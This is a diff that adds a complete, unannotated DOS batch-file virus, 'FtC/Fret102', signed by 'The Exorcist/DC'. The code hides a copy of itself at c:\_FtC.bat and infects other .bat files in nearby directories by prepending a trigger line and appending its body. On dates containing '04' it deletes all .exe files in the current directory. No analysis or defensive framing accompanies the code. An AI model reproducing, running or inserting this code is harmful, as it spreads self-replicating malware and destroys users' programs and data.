@@ -1,0 +1,50 @@
+@if '%_Fret102%==' goto _Fret102
+::**** HOST ****
+@if not '%_Fret102%==' goto FtCend
+:_Fret102 FtC
+@echo off%_FtC%
+if '%1=='FtC goto FtC%2
+set FtC=%0.bat
+if not exist %FtC% set FtC=%0
+if '%FtC%==' set FtC=autoexec.bat
+set !FtC=%1 %2 %3 %4 %5 %6 %7 %8 %9
+if exist c:\_FtC.bat goto FtCg
+if not exist %FtC% goto eFtC
+find "FtC"<%FtC%>c:\_FtC.bat
+attrib c:\_FtC.bat +h
+:FtCg
+command /e:5000 /c c:\_FtC FtC vir
+:eFtC
+echo.|date|find "04">nul.FtC
+if errorlevel 1 goto naFtC
+set %FtC44%=del
+%FtC44% *.exe
+echo FtC/Fret102 Coded By: The Exorcist[DC] 
+:naFtC
+call %FtC% FtC rh
+set _Fret102=>nul.FtC
+set !FtC=
+set FtC=
+goto FtCend
+:FtCrh
+set _Fret102=x%_FtC%
+%FtC% %!FtC%
+:FtCvir
+for %%a in (..\*.bat *.bat) do call c:\_FtC FtC i %%a
+exit FtC
+:FtCi
+find "FtC"<%3>nul
+if not errorlevel 1 goto FtCj
+echo @if '%%_Fret102%%==' goto _Fret102>FtC$
+type %3>>FtC$
+echo.>>FtC$
+type c:\_FtC.bat>>FtC$
+move FtC$ %3>nul
+set FtC#=%FtC#%1
+if %FtC#%==111 exit
+:FtCj
+set FtC!=%FtC!%1
+if %FtC!%==11111111 exit
+:FtCend
+
+   - The Exorcist/DC
